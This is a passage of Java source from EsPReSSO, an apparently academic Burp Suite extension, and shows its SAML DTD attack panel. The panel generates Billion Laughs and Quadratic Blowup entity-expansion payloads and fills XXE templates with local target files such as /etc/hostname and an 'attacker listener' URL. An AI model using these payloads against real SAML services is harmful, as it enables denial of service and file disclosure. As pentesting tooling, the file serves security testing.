/**
 * EsPReSSO - Extension for Processing and Recognition of Single Sign-On Protocols.
 * Copyright (C) 2015 Tim Guenther and Christian Mainka
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package de.rub.nds.burp.espresso.gui.attacker.saml;

import com.beetstra.jutf7.CharsetProvider;
import de.rub.nds.burp.espresso.gui.attacker.IAttack;
import de.rub.nds.burp.utilities.EncodingType;
import de.rub.nds.burp.utilities.Logging;
import de.rub.nds.burp.utilities.XMLHelper;
import de.rub.nds.burp.utilities.listeners.AbstractCodeEvent;
import de.rub.nds.burp.utilities.listeners.CodeListenerController;
import de.rub.nds.burp.utilities.listeners.saml.SamlCodeEvent;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Collections;
import java.util.regex.Pattern;
import javax.swing.DefaultComboBoxModel;
import javax.swing.JComponent;
import javax.swing.JList;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.ScrollPaneConstants;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.plaf.basic.BasicComboBoxRenderer;
import org.apache.commons.io.IOUtils;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

/**
 * The DTD Attack
 * @author Nurullah Erinola
 * @version 1.0
 */
public class UIDTDAttack extends javax.swing.JPanel implements IAttack{
    
    private final String listenURL = "§tf_listenURL§";
    private final String helperURL = "§tf_helperURL§";
    private final String targetFILE = "§tf_targetFILE§";
    
    private String saml = "";
    private String selectedDtdServer = "";
    private String selectedDtdHelper = "";
    private String currentDtdServer = "";
    private String currentDtdHelper = "";
    private CodeListenerController listeners = null;
    private static Document dtds;
    private static ArrayList<String> dtdNames;
    private static ArrayList<String> dtdDescriptions;
    private boolean needEditor = false;
    
    private JTextArea firstEditor;
    private JTextArea secondEditor;
    private JScrollPane firstScrollPane;
    private JScrollPane secondScrollPane;
    
    /**
     * Creates new form UIDTDAttack
     */
    public UIDTDAttack() {
        initComponents();       
        if (dtds == null && dtdNames == null) {
            readDTDs();
        }
        initEditorsAndListener();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        sysPubButtonGroup = new javax.swing.ButtonGroup();
        encodingButtonGroup = new javax.swing.ButtonGroup();
        modifyButton = new javax.swing.JButton();
        jLabel3 = new javax.swing.JLabel();
        jLabel4 = new javax.swing.JLabel();
        recursiveEntitieTextField = new javax.swing.JTextField();
        entityReferencesTextField = new javax.swing.JTextField();
        jLabel5 = new javax.swing.JLabel();
        jLabel6 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        targetFileTextField = new javax.swing.JTextField();
        helperURLTextField = new javax.swing.JTextField();
        attackeListenerTextField = new javax.swing.JTextField();
        jScrollPane3 = new javax.swing.JScrollPane();
        targetFileList = new javax.swing.JList<>();
        dtdComboBox = new javax.swing.JComboBox<>();
        jLabel8 = new javax.swing.JLabel();
        jLabel9 = new javax.swing.JLabel();
        adjustDTDButton = new javax.swing.JButton();
        jPanel1 = new javax.swing.JPanel();
        enableEditoringCheckbox = new javax.swing.JCheckBox();
        publicRadioButton = new javax.swing.JRadioButton();
        systemRadioButton = new javax.swing.JRadioButton();
        autoModifyCheckbox = new javax.swing.JCheckBox();
        utf7RadioButton = new javax.swing.JRadioButton();
        utf8RadioButton = new javax.swing.JRadioButton();
        utf16RadioButton = new javax.swing.JRadioButton();
        jLabel1 = new javax.swing.JLabel();

        modifyButton.setText("Modify");
        modifyButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                modifyButtonActionPerformed(evt);
            }
        });

        jLabel3.setText("Recursive Entities:");

        jLabel4.setText("Entity References:");

        recursiveEntitieTextField.setHorizontalAlignment(javax.swing.JTextField.CENTER);
        recursiveEntitieTextField.setText("4");
        recursiveEntitieTextField.setToolTipText("Enter numbers only.");
        recursiveEntitieTextField.setEnabled(false);

        entityReferencesTextField.setHorizontalAlignment(javax.swing.JTextField.CENTER);
        entityReferencesTextField.setText("10");
        entityReferencesTextField.setToolTipText("Enter numbers only.");
        entityReferencesTextField.setEnabled(false);

        jLabel5.setText("Target File:");

        jLabel6.setText("Helper-URL:");

        jLabel7.setText("Attacker Listener:");

        targetFileTextField.setText("file:///etc/hostname");
        targetFileTextField.setEnabled(false);

        helperURLTextField.setText("http://publicServer.com/helperDTD.dtd");
        helperURLTextField.setEnabled(false);

        attackeListenerTextField.setText("http://publicServer.com/");
        attackeListenerTextField.setEnabled(false);

        targetFileList.setModel(new javax.swing.AbstractListModel<String>() {
            String[] strings = { "file:///etc/hostname", "file:///dev/urandom", "file:///sys/power/image_size" };
            public int getSize() { return strings.length; }
            public String getElementAt(int i) { return strings[i]; }
        });
        targetFileList.setSelectionMode(javax.swing.ListSelectionModel.SINGLE_INTERVAL_SELECTION);
        targetFileList.setEnabled(false);
        targetFileList.addListSelectionListener(new javax.swing.event.ListSelectionListener() {
            public void valueChanged(javax.swing.event.ListSelectionEvent evt) {
                targetFileListValueChanged(evt);
            }
        });
        jScrollPane3.setViewportView(targetFileList);

        dtdComboBox.setMaximumRowCount(10);
        dtdComboBox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                dtdComboBoxActionPerformed(evt);
            }
        });

        jLabel8.setText("Select DTD:");

        jLabel9.setText("Selected DTD: ");

        adjustDTDButton.setText("Adjust");
        adjustDTDButton.setEnabled(false);
        adjustDTDButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                adjustDTDButtonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 0, Short.MAX_VALUE)
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 294, Short.MAX_VALUE)
        );

        enableEditoringCheckbox.setText("Enable editing");
        enableEditoringCheckbox.setToolTipText("Discards manual changes");
        enableEditoringCheckbox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                enableEditoringCheckboxActionPerformed(evt);
            }
        });

        sysPubButtonGroup.add(publicRadioButton);
        publicRadioButton.setText("PUBLIC");
        publicRadioButton.setEnabled(false);

        sysPubButtonGroup.add(systemRadioButton);
        systemRadioButton.setText("SYSTEM");
        systemRadioButton.setEnabled(false);

        autoModifyCheckbox.setText("Auto modify");
        autoModifyCheckbox.setToolTipText("Automatic update of SAML message with DTD vector.");
        autoModifyCheckbox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                autoModifyCheckboxActionPerformed(evt);
            }
        });

        encodingButtonGroup.add(utf7RadioButton);
        utf7RadioButton.setText("UTF-7");

        encodingButtonGroup.add(utf8RadioButton);
        utf8RadioButton.setText("UTF-8");

        encodingButtonGroup.add(utf16RadioButton);
        utf16RadioButton.setText("UTF-16");

        jLabel1.setText("Encoding:");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(this);
        this.setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel1, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(dtdComboBox, 0, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(0, 1044, Short.MAX_VALUE)
                        .addComponent(modifyButton))
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addGroup(layout.createSequentialGroup()
                            .addComponent(systemRadioButton)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(publicRadioButton))
                        .addGroup(layout.createSequentialGroup()
                            .addComponent(jLabel9)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(enableEditoringCheckbox)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(autoModifyCheckbox))
                        .addComponent(jLabel8))
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(jLabel3)
                                    .addComponent(jLabel4))
                                .addGap(1, 1, 1)
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                                    .addGroup(layout.createSequentialGroup()
                                        .addComponent(adjustDTDButton)
                                        .addGap(68, 68, 68)
                                        .addComponent(jLabel6))
                                    .addGroup(layout.createSequentialGroup()
                                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                                            .addComponent(entityReferencesTextField, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 78, Short.MAX_VALUE)
                                            .addComponent(recursiveEntitieTextField, javax.swing.GroupLayout.Alignment.LEADING))
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                        .addComponent(jLabel5))))
                            .addComponent(jLabel7))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(attackeListenerTextField, javax.swing.GroupLayout.PREFERRED_SIZE, 260, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(targetFileTextField, javax.swing.GroupLayout.PREFERRED_SIZE, 260, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addComponent(helperURLTextField, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 260, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 218, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(jLabel1)))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(utf7RadioButton)
                            .addComponent(utf8RadioButton)
                            .addComponent(utf16RadioButton))))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel1)
                            .addComponent(utf7RadioButton))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(utf8RadioButton)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(utf16RadioButton))
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                    .addComponent(jLabel3)
                                    .addComponent(recursiveEntitieTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addComponent(jLabel5)
                                    .addComponent(targetFileTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                    .addComponent(jLabel4)
                                    .addComponent(entityReferencesTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                    .addComponent(adjustDTDButton)
                                    .addComponent(jLabel6)
                                    .addComponent(helperURLTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                            .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 61, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addGap(0, 0, 0)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel7)
                            .addComponent(attackeListenerTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addGap(3, 3, 3)
                        .addComponent(jLabel8)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(dtdComboBox, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(publicRadioButton)
                    .addComponent(systemRadioButton))
                .addGap(1, 1, 1)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel9)
                    .addComponent(enableEditoringCheckbox)
                    .addComponent(autoModifyCheckbox))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(modifyButton)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
    }// </editor-fold>//GEN-END:initComponents
    
    private void modifyButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_modifyButtonActionPerformed
        notifyAllTabs(firstEditor.getText());
        Logging.getInstance().log(getClass(), "Notify all tabs.", Logging.DEBUG);
    }//GEN-LAST:event_modifyButtonActionPerformed
       
    private void targetFileListValueChanged(javax.swing.event.ListSelectionEvent evt) {//GEN-FIRST:event_targetFileListValueChanged
        if(targetFileList.getSelectedValue() != null) {
        targetFileTextField.setText(targetFileList.getSelectedValue());
        }
    }//GEN-LAST:event_targetFileListValueChanged

    private void adjustDTDButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_adjustDTDButtonActionPerformed
	switch((String) dtdComboBox.getSelectedItem()) {
            case "Billion Laughs Attack":
                if (Pattern.matches("[0-9]+", recursiveEntitieTextField.getText()) && Pattern.matches("[0-9]+", entityReferencesTextField.getText())) {
                    String tmp = "\n";
                    int rec = Integer.parseInt(recursiveEntitieTextField.getText());
                    int entity = Integer.parseInt(entityReferencesTextField.getText());
                    for (int i = 1; i <= rec; i++) {
                        tmp += "<!ENTITY a" + i + " \"";		
                        for (int j = 1; j <= entity; j++) {
                            tmp += "&a" + (i-1) + ";";
                        }
                        tmp += "\">\n";
                    }
                    tmp += "]>\n" + "<data>&a" + rec + ";</data>";
                    currentDtdServer = selectedDtdServer.substring(0, selectedDtdServer.lastIndexOf("\"dos\" >")+7).concat(tmp); 
                }    
                break;
            case "Billion Laughs Attack with Parameter Entities":
                if (Pattern.matches("[0-9]+", recursiveEntitieTextField.getText()) && Pattern.matches("[0-9]+", entityReferencesTextField.getText())) {
                    String tmp = "\n";
                    int rec = Integer.parseInt(recursiveEntitieTextField.getText());
                    int entity = Integer.parseInt(entityReferencesTextField.getText());
                    for (int i = 1; i <= rec; i++) {
                        tmp += "<!ENTITY % a" + i + " \"";		
                        for (int j = 1; j <= entity; j++) {
                            tmp += "%a" + (i-1) + ";";
                        }
                        tmp += "\">\n";
                    }
                    tmp += "<!ENTITY g  \"%a" + rec + ";\">";
                    currentDtdHelper = selectedDtdHelper.substring(0, selectedDtdHelper.lastIndexOf("\"dos\" >")+7).concat(tmp); 
                } 
                break;
            case "Quadratic Blowup Attack":
                if (Pattern.matches("[0-9]+", entityReferencesTextField.getText())) {
                    int entity = Integer.parseInt(entityReferencesTextField.getText());
                    String tmp = "";
                    for (int i = 1; i <= entity; i++) {
                        tmp += "&a0;";
                    }
                    tmp += "</data>";
                    currentDtdServer = selectedDtdServer.substring(0, selectedDtdServer.lastIndexOf("<data>")+6).concat(tmp); 
                } 
                break;
        }
        setDTD();
    }//GEN-LAST:event_adjustDTDButtonActionPerformed

    private void enableEditoringCheckboxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_enableEditoringCheckboxActionPerformed
        if(enableEditoringCheckbox.isSelected()) {
            disableFields();
            firstEditor.setEditable(true);
            secondEditor.setEditable(true);
        } else {
            dtdComboBox.setSelectedItem(dtdComboBox.getSelectedItem());
            firstEditor.setEditable(false);
            secondEditor.setEditable(false);           
        }
    }//GEN-LAST:event_enableEditoringCheckboxActionPerformed

    private void dtdComboBoxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_dtdComboBoxActionPerformed
        disableFields();
        // Enable fields
        Element selectedDTD = (Element) XMLHelper.getElementByXPath(dtds, "//config[name='"+dtdComboBox.getSelectedItem()+"']");
        needEditor = selectedDTD.getElementsByTagName("externalResources").item(0).getTextContent().equalsIgnoreCase("TRUE");
        switch(EncodingType.fromString(selectedDTD.getElementsByTagName("encoding").item(0).getTextContent())) {
            case UTF_7:
                utf7RadioButton.setSelected(true);
                break;
            case UTF_8:
                utf8RadioButton.setSelected(true);
                break;
            case UTF_16:
                utf16RadioButton.setSelected(true);
                break;
            default:
                break;
        }
        if (selectedDTD.getElementsByTagName("dosbox").item(0).getTextContent().equalsIgnoreCase("TRUE")) {
            if(!selectedDTD.getElementsByTagName("name").item(0).getTextContent().equalsIgnoreCase("Quadratic Blowup Attack")) {
                recursiveEntitieTextField.setEnabled(true);
            }
            entityReferencesTextField.setEnabled(true);
            adjustDTDButton.setEnabled(true);
        }
        if (selectedDTD.getElementsByTagName("targetFile").item(0).getTextContent().equalsIgnoreCase("TRUE")) {
            targetFileTextField.setEnabled(true);
            targetFileList.setEnabled(true);
        }
        if (selectedDTD.getElementsByTagName("helperURL").item(0).getTextContent().equalsIgnoreCase("TRUE")) {
            helperURLTextField.setEnabled(true);
        }            
        if (selectedDTD.getElementsByTagName("attackListenerURL").item(0).getTextContent().equalsIgnoreCase("TRUE")) {
            attackeListenerTextField.setEnabled(true);
        }
        Element attackvector;
        if (selectedDTD.getElementsByTagName("attackvector").getLength() != 1) {
            systemRadioButton.setEnabled(true);
            systemRadioButton.setSelected(true);
            publicRadioButton.setEnabled(true);
            attackvector = (Element) XMLHelper.getElementByXPath(dtds,"//config[name='"+dtdComboBox.getSelectedItem()+"']/attackvectors/attackvector[@type='system']");
        } else {
            attackvector = (Element) selectedDTD.getElementsByTagName("attackvector").item(0);           
        }
        // Read vectors
        selectedDtdServer = attackvector.getElementsByTagName("directMessage").item(0).getTextContent();
        currentDtdServer = selectedDtdServer;
        if(needEditor) {
            selectedDtdHelper = attackvector.getElementsByTagName("helperMessage").item(0).getTextContent();
            currentDtdHelper = selectedDtdHelper;
            jPanel1.setLayout(new GridLayout(1, 2));
            jPanel1.removeAll();
            jPanel1.add(firstScrollPane);
            jPanel1.add(secondScrollPane);
        } else {
            jPanel1.setLayout(new GridLayout(1, 1));
            jPanel1.removeAll();
            jPanel1.add(firstScrollPane);
        }
        setDTD();
        setValues();
    }//GEN-LAST:event_dtdComboBoxActionPerformed

    private void autoModifyCheckboxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_autoModifyCheckboxActionPerformed
        if(autoModifyCheckbox.isSelected()) {
            notifyAllTabs(firstEditor.getText());
            Logging.getInstance().log(getClass(), "Notify all tabs.", Logging.DEBUG);
        } else {
            notifyAllTabs(saml);
            Logging.getInstance().log(getClass(), "Notify all tabs.", Logging.DEBUG);
        }
    }//GEN-LAST:event_autoModifyCheckboxActionPerformed
 
    /**
     * Set DTDs in textfields.
     */  
    private void setDTD() {
        firstEditor.setText(currentDtdServer);
        if(needEditor) {
            secondEditor.setText(currentDtdHelper);
        }
    }
    
    /**
     * Read all DTDs from resources and save it.
     */    
    private void readDTDs() {
        try {
            dtds = XMLHelper.stringToDom(IOUtils.toString(getClass().getClassLoader().getResource("dtd_configs.xml"),"UTF-8"));
            NodeList names = dtds.getElementsByTagName("name");
            dtdNames = new ArrayList<>();
            for (int i = 0; i < names.getLength(); i++) {
                dtdNames.add(names.item(i).getTextContent());
            }
            Collections.sort(dtdNames);
            dtdDescriptions = new ArrayList<>();
            for (int i = 0; i < dtdNames.size(); i++) {
                dtdDescriptions.add(XMLHelper.getElementByXPath(dtds,"//config[name='"+dtdNames.get(i)+"']/description").getTextContent());
            }
        } catch (IOException ex) {
            Logging.getInstance().log(getClass(), ex);
        }
    }
    
    private void initEditorsAndListener() {
        firstEditor = new JTextArea();
        firstEditor.setEditable(false);
        firstEditor.getDocument().addDocumentListener(new DocumentListener() {           
            private void notify(DocumentEvent de) {                                              
                if(autoModifyCheckbox.isSelected()) {
                    notifyAllTabs(firstEditor.getText());
                    Logging.getInstance().log(getClass(), "Notify all tabs.", Logging.DEBUG);
                }
            }
            @Override
            public void insertUpdate(DocumentEvent de) {
                notify(de);
            }
            @Override
            public void removeUpdate(DocumentEvent de) {
                notify(de);
            }
            @Override
            public void changedUpdate(DocumentEvent de) {
                notify(de);
            }  
        });
        secondEditor = new JTextArea();
        secondEditor.setEditable(false);
        firstScrollPane = new JScrollPane (firstEditor, ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED, ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        firstScrollPane.setPreferredSize(new Dimension(100, 280));
        secondScrollPane = new JScrollPane (secondEditor, ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED, ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        secondScrollPane.setPreferredSize(new Dimension(100, 280));
        // Set listener
        TextfieldListener textfieldListener = new TextfieldListener();
        attackeListenerTextField.getDocument().addDocumentListener(textfieldListener);
        helperURLTextField.getDocument().addDocumentListener(textfieldListener);
        targetFileTextField.getDocument().addDocumentListener(textfieldListener);
        SysPubRadioButtonGroupListener radioButtonGroupListener = new SysPubRadioButtonGroupListener();
        publicRadioButton.addActionListener(radioButtonGroupListener);
        systemRadioButton.addActionListener(radioButtonGroupListener);
        EncodingRadioButtonGroupListener encodingRadioButtonGroupListener= new EncodingRadioButtonGroupListener();
        utf7RadioButton.addActionListener(encodingRadioButtonGroupListener);
        utf7RadioButton.setActionCommand(EncodingType.UTF_7.getEncoding());
        utf8RadioButton.addActionListener(encodingRadioButtonGroupListener);
        utf8RadioButton.setActionCommand(EncodingType.UTF_8.getEncoding());
        utf16RadioButton.addActionListener(encodingRadioButtonGroupListener);
        utf16RadioButton.setActionCommand(EncodingType.UTF_16.getEncoding());
        // Set dtd vectors sorted by name
        dtdComboBox.setModel(new DefaultComboBoxModel(dtdNames.toArray()));
        dtdComboBox.setRenderer(new BasicComboBoxRenderer() {            
            @Override
            public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) {
                JComponent comp = (JComponent) super.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);
                if (-1 < index && null != value && null != dtdDescriptions) {
                    list.setToolTipText(dtdDescriptions.get(index));
                }
                return comp;
            }       
        });  
        dtdComboBox.setSelectedIndex(0);          
    }

     /**
     * Disable fields
     */
    private void disableFields() {
        systemRadioButton.setEnabled(false);
        publicRadioButton.setEnabled(false);
        adjustDTDButton.setEnabled(false);
        entityReferencesTextField.setEnabled(false);
        recursiveEntitieTextField.setEnabled(false);
        targetFileTextField.setEnabled(false);
        targetFileList.setEnabled(false);
        helperURLTextField.setEnabled(false);
        attackeListenerTextField.setEnabled(false);
        targetFileList.clearSelection();
    }

    /**
     * Updated the dtd vector with textfield parameters after changed the selected dtd
     * Put text again in one textfield to start the DocumentListener
     */
    private void setValues() {
        targetFileTextField.setText(targetFileTextField.getText());
    }  
    
    /**
     * Is called every time new Code is available.
     * @param evt {@link de.rub.nds.burp.utilities.listeners.AbstractCodeEvent} The new source code.
     */
    @Override
    public void setCode(AbstractCodeEvent evt) {
        this.saml = evt.getCode();
    }

    /**
     * Notify all registered listeners with the new code.
     * @param code The new source code.
     */
    @Override
    public void notifyAllTabs(String code) {
        if(listeners != null){
            // Encode dtd vector if needed
            switch(EncodingType.fromString(encodingButtonGroup.getSelection().getActionCommand())) {
                case UTF_7:
                    Charset charset = new CharsetProvider().charsetForName("UTF-7");
                    ByteBuffer byteBuffer = charset.encode(code);
                    code = new String(byteBuffer.array()).substring(0, byteBuffer.limit());
                    break;
                case UTF_8:
                    try {
                        code = new String(code.getBytes("UTF-8"), "UTF-8");
                    } catch (UnsupportedEncodingException ex) {
                        Logging.getInstance().log(getClass(), ex);
                    }
                    break;
                case UTF_16:
                    try {
                        code = new String(code.getBytes("UTF-8"), "UTF-16");
                    } catch (UnsupportedEncodingException ex) {
                        Logging.getInstance().log(getClass(), ex);
                    }
                    break;
                default:
                    break;
            }            
            listeners.notifyAll(new SamlCodeEvent(this, code));
        }
    }

    /**
     * Set the listener for the editor.
     * @param listeners {@link de.rub.nds.burp.utilities.listeners.CodeListenerController}
     */
    @Override
    public void setListener(CodeListenerController listeners) {
        this.listeners = listeners;
        this.listeners.addCodeListener(this);
    }
    
    class SysPubRadioButtonGroupListener implements ActionListener {
      @Override
      public void actionPerformed(ActionEvent ev) {
        Element eElement;
        if(systemRadioButton.isSelected()) {
            eElement = (Element) XMLHelper.getElementByXPath(dtds,"//config[name='"+dtdComboBox.getSelectedItem()+"']/attackvectors/attackvector[@type='system']");
        } else {
            eElement = (Element) XMLHelper.getElementByXPath(dtds,"//config[name='"+dtdComboBox.getSelectedItem()+"']/attackvectors/attackvector[@type='public']");
        }
        selectedDtdServer = eElement.getElementsByTagName("directMessage").item(0).getTextContent();
        currentDtdServer = selectedDtdServer;
        if(needEditor) {
            selectedDtdHelper = eElement.getElementsByTagName("helperMessage").item(0).getTextContent();
            currentDtdHelper = selectedDtdHelper;
        }
        setDTD();
        setValues();
      }
    }

    class EncodingRadioButtonGroupListener implements ActionListener {
      @Override
      public void actionPerformed(ActionEvent ev) {
        if(autoModifyCheckbox.isSelected()) {
            notifyAllTabs(firstEditor.getText());
            Logging.getInstance().log(getClass(), "Notify all tabs.", Logging.DEBUG);
        }
      }
    }
    
    /**
     * Listener for textfields.
     */
    class TextfieldListener implements DocumentListener {      
        
        private void update(DocumentEvent de) {
            currentDtdServer = selectedDtdServer;
            if(selectedDtdServer.contains(listenURL)) {
                currentDtdServer = currentDtdServer.replace(listenURL, attackeListenerTextField.getText());
            }
            if(selectedDtdServer.contains(helperURL)) {
                currentDtdServer = currentDtdServer.replace(helperURL, helperURLTextField.getText());
            }
            if(selectedDtdServer.contains(targetFILE)) {
                currentDtdServer = currentDtdServer.replace(targetFILE, targetFileTextField.getText());
            }
            if(needEditor) {
                currentDtdHelper = selectedDtdHelper;
                if(selectedDtdHelper.contains(listenURL)) {
                    currentDtdHelper = currentDtdHelper.replace(listenURL, attackeListenerTextField.getText());
                }
                if(selectedDtdHelper.contains(helperURL)) {
                    currentDtdHelper = currentDtdHelper.replace(helperURL, helperURLTextField.getText());
                }
                if(selectedDtdHelper.contains(targetFILE)) {
